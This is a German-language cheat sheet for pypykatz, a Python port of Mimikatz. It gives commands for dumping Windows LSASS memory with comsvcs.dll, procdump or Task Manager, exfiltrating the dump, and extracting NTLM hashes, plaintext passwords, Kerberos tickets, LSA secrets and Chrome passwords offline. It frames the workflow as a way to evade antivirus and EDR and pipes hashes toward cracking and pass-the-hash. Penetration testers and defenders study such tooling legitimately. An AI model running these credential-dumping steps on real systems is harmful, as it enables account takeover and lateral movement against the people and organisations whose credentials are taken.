<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


#pypykatz Cheatsheet

[pypykatz](https://github.com/skelsec/pypykatz) ist eine reine Python-Implementierung von [Mimikatz](https://github.com/gentilkiwi/mimikatz). Es ermöglicht Penetrationstestern und Incident-Respondern, Windows-LSASS-Speicherauszüge, SAM/SYSTEM/SECURITY-Registrierungsstrukturen, DPAPI-Schlüssel und Kerberos-Tickets vollständig offline unter Linux und macOS zu analysieren, ohne Windows Defender, Endpoint Detection and Response (EDR)-Agenten auszulösen oder Live-Windows-Hostzugriff zu benötigen.

---

## Inhaltsverzeichnis

- [Überblick & Betriebssicherheit (OpSec)](#overview--operational-security-opsec)
- [Installation](#installation)
- [Offline-LSASS-Dump-Parsing (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM & SYSTEM Hive Extraction (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [LSA Secrets Extraction (`registry security`)](#lsa-secrets-extraction-registry-security)
- [DPAPI-Hauptschlüssel und Parsen von Anmeldeinformationen](#dpapi-master-keys--credential-parsing)
- [JSON-Export und automatisierte Anmeldeinformationspipelines](#json-export--automated-credential-pipelines)
- [Techniken zum sicheren Dump von LSASS unter Windows](#techniques-to-safely-dump-lsass-on-windows)

---

## Übersicht & Betriebssicherheit (OpSec)

Beim Ausführen des Standard-`mimikatz.exe` auf einem Windows-Zielcomputer werden häufig Verhaltenssensoren und statische Signaturen ausgelöst. `pypykatz` trennt die Dumping-Phase von der Parsing-Phase:
1. Löschen Sie den LSASS-Prozessspeicher mit nativen oder LOLBAS-Tools (Task Manager, `procdump`, `rundll32.exe` oder `comsvcs.dll`).
2. Exfiltrieren Sie die `.dmp`-Datei in Ihr Linux-Analysesystem.
3. Analysieren Sie Anmeldeinformationen vollständig offline mit `pypykatz` ohne AV-Risiko.

---

## Installation
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Offline-LSASS-Dump-Parsing (`lsa minidump`)

Analysieren Sie von `lsass.exe` generierte Speicherauszüge, um Klartext-Passwörter, NTLM-Hashes, SHA1-Hashes, Kerberos-Tickets (TGT/TGS) und AES-Verschlüsselungsschlüssel abzurufen:

### 1. Grundlegende Minidump-Analyse
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
Die Ausgabe extrahiert nach Sicherheitsanbietern partitionierte Anmeldeinformationen:
- **msv1_0:** Benutzernamen, Domänen, NTLM-Hashes und LM-Hashes.
- **wdigest:** Klartext-Passwörter (wenn WDigest-Caching aktiviert ist).
- **Kerberos:** Kerberos-Ticketsitzungen und AES-Schlüssel.
- **ssp:** Anmeldeinformationen für den Sicherheitssupportanbieter.
- **livessp:** Anmeldeinformationen für das Microsoft-Konto.
- **cloudap:** Azure AD Primary Refresh Tokens (PRT) und Sitzungsschlüssel.

### 2. Mehrere Speicherauszüge rekursiv analysieren
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## SAM & SYSTEM Hive Extraction (`registry sam`)

Extrahieren Sie Benutzernamen, RIDs und NTLM-Kennwort-Hashes lokaler Konten aus Offline-Hive-Kopien der Windows-Registrierung:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Ausgabe:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## Extraktion von LSA-Geheimnissen (`registry security`)

Stellen Sie LSA-Geheimnisse, Maschinenkontokennwörter, Standarddomänenkennwörter und Klartextschlüssel für Dienstkonten aus den Hives `SECURITY` und `SYSTEM` wieder her:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Zu den extrahierten Geheimnissen gehören:
- `_SC_DefaultPassword`: Anmeldeinformationen für die automatische Anmeldung.
- `$MACHINE.ACC`: NTLM-Hashes des Domänencomputerkontos.
– Zwischengespeicherte Domänenanmeldeinformationen (DCC2/mscache2).

---

## DPAPI-Hauptschlüssel und Parsen von Anmeldeinformationen

Die Data Protection API (DPAPI) verschlüsselt Chrome-Passwörter, WLAN-Schlüssel und RDP-Anmeldeinformationen:

### 1. Extrahieren Sie die DPAPI-Hauptschlüssel aus der Registrierung und dem System
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. In Chrome gespeicherte Passwörter entschlüsseln
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## JSON-Export und automatisierte Anmeldeinformations-Pipelines

Exportieren Sie geparste Anmeldeinformationen direkt nach JSON zur sofortigen Aufnahme in Hashcat, BloodHound oder CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Extrahieren Sie saubere NTLM-Hashes mit `jq` zum sofortigen Hash-Cracken oder Pass-the-Hash:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Techniken zum sicheren Dump von LSASS unter Windows

Um Speicher in `pypykatz` einzuspeisen, erstellen Sie einen LSASS-Minidump auf dem Zielhost mit nativen Komponenten:

### 1. Native LOLBAS über `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. Task-Manager-GUI
1. Öffnen Sie den Task-Manager als Administrator.
2. Klicken Sie unter **Details** mit der rechten Maustaste auf `lsass.exe`.
3. Klicken Sie auf **Dump-Datei erstellen** (gespeichert unter `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Führen Sie nach dem Herunterladen auf Ihren Linux-Computer `pypykatz lsa minidump lsass.dmp` aus.*